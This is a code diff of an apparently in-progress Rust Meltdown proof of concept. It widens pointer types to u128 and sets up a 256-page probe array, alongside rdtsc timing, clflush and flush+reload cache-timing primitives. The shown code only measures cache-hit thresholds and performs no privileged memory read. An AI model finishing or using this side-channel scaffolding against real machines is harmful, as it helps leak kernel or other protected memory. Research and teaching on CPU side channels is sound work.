@@ -21,7 +21,7 @@ pub fn rdtsc() -> u64 {
     ((high as u64) << 32) | (low as u64)
 }
 
-pub fn maccess(pointer: *const usize) {
+pub fn maccess(pointer: *const u128) {
     unsafe {
         asm!(
             "mov {tmp}, [{x}]",
@@ -31,7 +31,7 @@ pub fn maccess(pointer: *const usize) {
     }
 }
 
-pub fn flush(pointer: *const usize) {
+pub fn flush(pointer: *const u128) {
     unsafe {
         asm!(
             "clflush [{x}]",
@@ -40,7 +40,7 @@ pub fn flush(pointer: *const usize) {
     }
 }
 
-pub fn flush_reload(pointer: *const usize, cache_miss_threshold: u64) -> bool {
+pub fn flush_reload(pointer: *const u128, cache_miss_threshold: u64) -> bool {
     let start_time: u64;
     let end_time: u64;
     
@@ -57,8 +57,8 @@ pub fn detect_flush_reload_threshold() -> u64{
     let mut reload_time: u64 = 0;
     let mut flush_reload_time: u64 = 0;
     let count: u64 = 10000000;
-    let dummy: usize = 0; // TODO Use single value instead of array ok?
-    let pointer: *const usize;
+    let dummy: u128 = 0; // TODO Use single value instead of array ok?
+    let pointer: *const u128;
     let mut start_time: u64;
     let mut end_time: u64;
     
@@ -92,14 +92,14 @@ pub fn detect_flush_reload_threshold() -> u64{
 #[unsafe(no_mangle)]
 pub fn main() {
     println!("Meltdown start\n");
-    const array_size: usize = 256;
+    const ARRAY_SIZE: usize = 256 * 256; // 256 entries, each containing 256 u128's, meaning 256*4K
     
     println!("Current CPU time: {}", rdtsc());
     let cache_miss_threshold = detect_flush_reload_threshold();
     
-    let mem: [u8; array_size] = [0; array_size];
+    let mem: [u128; ARRAY_SIZE] = [0; ARRAY_SIZE];
     
-    for i in 0..array_size {
-        flush(&mem[i] as *const usize);
+    for i in 0..ARRAY_SIZE {
+        flush(&mem[i] as *const u128);
     }
 }
